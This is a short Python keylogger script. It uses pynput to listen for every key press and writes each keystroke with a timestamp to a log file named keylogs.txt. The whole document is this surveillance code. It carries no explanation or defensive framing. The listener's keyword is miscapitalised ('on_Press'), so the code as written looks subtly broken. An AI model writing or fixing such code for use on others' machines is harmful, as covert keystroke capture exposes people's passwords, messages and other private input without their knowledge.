from pynput.keyboard import Key,Listener
import logging

logdir=""

logging.basicConfig(filename=(logdir+"keylogs.txt"),level=logging.DEBUG,format='%(asctime)s:%(message)s')

def on_Press(key):
	logging.info(str(key))
	
with Listener(on_Press=on_Press)as listener:
	listener.join()
